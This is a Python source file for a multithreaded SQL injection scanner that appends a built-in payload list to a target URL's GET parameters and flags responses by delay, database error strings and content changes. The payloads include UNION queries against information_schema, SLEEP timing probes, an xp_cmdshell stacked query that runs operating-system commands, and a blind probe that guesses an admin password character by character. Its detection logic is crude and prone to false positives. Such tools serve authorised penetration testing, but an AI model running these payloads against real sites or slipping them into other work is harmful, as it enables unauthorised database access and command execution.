import threading
import requests
import time
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from bs4 import BeautifulSoup

class SQLiScanner:
    def __init__(self, base_url, max_workers=5, throttle=0.5):
        self.base_url = base_url
        self.max_workers = max_workers
        self.throttle = throttle
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = self._generate_payloads()
        self.lock = threading.Lock()

    def _generate_payloads(self):
        """Generate comprehensive SQLi test payloads"""
        return [
            # Basic detection
            "'", 
            "\"", 
            "'; --", 
            "\"; --",
            # Error-based
            "' OR 1=1--", 
            "' OR 'a'='a",
            "' UNION SELECT null--",
            # Time-based
            "' OR SLEEP(5)--",
            "' UNION SELECT SLEEP(5)--",
            # Boolean-based
            "' OR 1=1 AND '1'='1",
            "' OR 1=2 AND '1'='1",
            # Stacked queries
            "'; EXEC xp_cmdshell('dir')--",
            # Database-specific
            ("' UNION SELECT "
             "table_name FROM information_schema.tables--"),  # MySQL
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)--",  # PostgreSQL
            # Blind payloads
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--"
        ]

    def scan(self):
        """Main scanning method"""
        print("[⚡] Starting SQLi vulnerability assessment...")
        
        # Extract parameters from URL
        parsed = urlparse(self.base_url)
        params = parse_qs(parsed.query)
        
        # Test URL parameters
        if params:
            self._test_parameters(params)
        
        # Test forms (requires integration with spider results)
        # self._test_forms(forms)
        
        return self.vulnerabilities

    def _test_parameters(self, params):
        """Test GET parameters for SQLi vulnerabilities"""
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            total_tests = len(params) * len(self.payloads)
            
            with tqdm(total=total_tests, desc="SQLi Scan Progress", unit="test") as pbar:
                for param in params:
                    original_value = params[param][0]
                    for payload in self.payloads:
                        futures.append(
                            executor.submit(
                                self._test_param,
                                param,
                                original_value,
                                payload,
                                pbar
                            )
                        )
                        time.sleep(self.throttle)
                
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            with self.lock:
                                self.vulnerabilities.append(result)
                    except Exception as e:
                        continue

    def _test_param(self, param, original_value, payload, pbar):
        """Test a single parameter with payload"""
        try:
            # Create malicious URL
            test_value = original_value + payload
            test_url = self.base_url.replace(
                f"{param}={original_value}",
                f"{param}={test_value}",
                1
            )
            
            start_time = time.time()
            response = self.session.get(test_url, timeout=15)
            elapsed = time.time() - start_time
            
            # Detection logic
            is_vulnerable = False
            detection_method = ""
            
            # Time-based detection
            if elapsed > 5 and any(p in payload for p in ['SLEEP', 'WAITFOR']):
                is_vulnerable = True
                detection_method = "Time-based delay"
            
            # Error-based detection
            elif self._detect_errors(response.text):
                is_vulnerable = True
                detection_method = "Error message detection"
                
            # Content-based detection
            elif self._detect_content_changes(response.text):
                is_vulnerable = True
                detection_method = "Content manipulation"
            
            # Boolean-based detection
            control_response = self.session.get(self.base_url)
            if len(response.content) != len(control_response.content):
                is_vulnerable = True
                detection_method = "Content length variation"
            
            if is_vulnerable:
                return {
                    "type": "SQL Injection",
                    "param": param,
                    "payload": payload,
                    "method": detection_method,
                    "url": test_url,
                    "status": response.status_code,
                    "length": len(response.content)
                }
                
        except Exception as e:
            return None
        finally:
            pbar.update(1)

    def _detect_errors(self, response_text):
        """Detect database error messages in response"""
        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "unclosed quotation",
            "pg_exec",
            "syntax error",
            "ODBC Driver",
            "ORA-",
            "Microsoft OLE DB"
        ]
        return any(pattern in response_text for pattern in error_patterns)

    def _detect_content_changes(self, response_text):
        """Detect meaningful content changes"""
        original_soup = BeautifulSoup(self.session.get(self.base_url).text, 'html.parser')
        test_soup = BeautifulSoup(response_text, 'html.parser')
        
        # Compare meaningful elements
        return (
            len(original_soup.find_all('form')) != len(test_soup.find_all('form')) or
            "error" in response_text.lower() or
            "exception" in response_text.lower()
        )

    def _test_forms(self, forms):
        """Test POST forms for SQLi vulnerabilities (requires form data from spider)"""
        # Implementation similar to _test_parameters but for POST requests
        pass

    def generate_report(self):
        """Generate vulnerability report"""
        return {
            "sql_injection": {
                "count": len(self.vulnerabilities),
                "vulnerabilities": self.vulnerabilities
            }
        }